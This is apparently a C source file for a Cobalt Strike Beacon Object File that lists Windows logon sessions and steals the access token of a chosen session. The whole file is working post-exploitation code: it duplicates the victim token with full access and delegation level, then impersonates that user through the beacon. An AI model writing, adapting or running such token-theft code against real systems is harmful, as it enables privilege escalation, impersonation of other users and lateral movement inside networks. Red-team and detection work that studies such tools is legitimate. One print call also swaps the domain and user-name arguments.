#include "../common/beacon.h"
#include "../common/logon_sessions.h"
#include "steal_token.h"

DECLSPEC_IMPORT long __cdecl msvcrt$strtol(
    char const* _String,
    char**      _EndPtr,
    int         _Radix
);

WINADVAPI
BOOL
WINAPI
advapi32$DuplicateTokenEx(
    _In_ HANDLE hExistingToken,
    _In_ DWORD dwDesiredAccess,
    _In_opt_ LPSECURITY_ATTRIBUTES lpTokenAttributes,
    _In_ SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
    _In_ TOKEN_TYPE TokenType,
    _Outptr_ PHANDLE phNewToken
    );

WINBASEAPI
BOOL
WINAPI
kernel32$CloseHandle(
	_In_ _Post_ptr_invalid_ HANDLE hObject
);

LUID parse_logon_id(const char *input)
{
	char* endp;
	LUID logon_id;
	logon_id.HighPart = 0;
	logon_id.LowPart = msvcrt$strtol(input, &endp, 16);
	return logon_id;
}

void use_token(HANDLE token)
{
	HANDLE dup_token = NULL;
	if (!advapi32$DuplicateTokenEx(token, TOKEN_ALL_ACCESS, 0, SecurityDelegation, TokenPrimary, &dup_token)) {
		BeaconPrintf(CALLBACK_ERROR, "could not duplicate token");
	}

	if (!BeaconUseToken(dup_token)) {
		BeaconPrintf(CALLBACK_ERROR, "could not use token");
		kernel32$CloseHandle(dup_token);
	}
}

// stupid printer... not good at the BOF
BOOL display_logon_sessions_callback(SECURITY_LOGON_SESSION_DATA *session_data, void* unused)
{
	if (session_data->UserName.Length && session_data->LogonDomain.Length) {
		BeaconPrintf(
			CALLBACK_OUTPUT,
			"LogonId=%llx, SessionId=%lu, AuthPkg=%ls, Domain=%ls, UserName=%ls, LoginType=%lu",
			session_data->LogonId,
			session_data->Session,
			session_data->AuthenticationPackage.Buffer,
			session_data->UserName.Buffer,
			session_data->LogonDomain.Buffer,
			session_data->LogonType
		);
	}
	return TRUE;
}

void go(char* args, int alen)
{
	HANDLE token = NULL;

	if (alen == 5 && *(int*)args == *(int*)"null") {
		list_logon_sessions(display_logon_sessions_callback, NULL);
		BeaconPrintf(CALLBACK_OUTPUT, "[*] pass one LogonId to steal token");
		return;
	}

	LUID logon_id = parse_logon_id(args);
	if (logon_id.HighPart == 0 && logon_id.LowPart == 0) {
		return;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "stealing token with logon id 0x%08llx", logon_id);
	token = steal_token_with_logon_id(&logon_id);
	if (token) {
		use_token(token);
		kernel32$CloseHandle(token);
	}
}

